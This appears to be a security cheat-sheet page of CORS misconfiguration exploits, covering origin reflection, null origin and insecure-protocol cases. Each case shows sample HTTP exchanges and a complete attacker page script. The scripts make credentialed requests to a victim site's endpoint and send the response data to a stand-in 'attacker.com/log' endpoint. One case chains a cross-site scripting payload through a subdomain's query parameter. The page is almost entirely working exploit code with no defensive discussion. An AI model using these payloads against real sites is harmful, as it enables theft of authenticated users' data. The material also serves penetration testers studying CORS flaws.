---
title: CORS Examples
desc:  Examples of Cross Origin Resource Sharing.
tags: [CORS, Web]
alts: []
website:
render_with_liquid: false
---

## Origin reflection

```html
<!-- Request -->
GET /details HTTP/1.1
Host: vulnerable.com
Origin: https://attacker.com
<!-- error parsing -->
Origin: https://vulnerable.com.attacker.com


<!-- Response -->
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
<!-- error parsing -->
Access-Control-Allow-Origin: https://vulnerable.com.attacker.com
Access-Control-Allow-Credentials: true


<!-- https://attacker.com/exploit -->
<!-- https://vulnerable.com.attacker.com/exploit -->
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET', 'https://vulnerable.com/details', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = '/log?key=' + this.responseText;
    }
</script>
```

<br />

## Null origin

```html
<!-- Request -->
GET /details HTTP/1.1
Host: vulnerable.com
Origin: null

<!-- Response -->
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

<!-- https://attacker.com/exploit -->
<iframe
    sandbox="allow-scripts allow-top-navigation allow-forms"
    srcdoc="<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('GET', 'https://vulnerable.com/details', true);
        req.withCredentials = true;
        req.send();
        
        function reqListener() {
            location = 'https://attacker.com/log?key=' + encodeURIComponent(this.responseText);
        }
        </script>"
></iframe>
```

<br />

## Insecure protocol

```html
<!-- Request -->
GET /details HTTP/1.1
Host: vulnerable.com
Origin: http://subdomain.vulnerable.com


<!-- Response -->
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://subdomain.vulnerable.com
Access-Control-Allow-Credentials: true


<!-- https://attacker.com/exploit -->
<script>
    document.location="http://subdomain.vulnerable.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable.com/details',true); req.withCredentials = true;req.send();function reqListener() {location='https://attacker.com/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```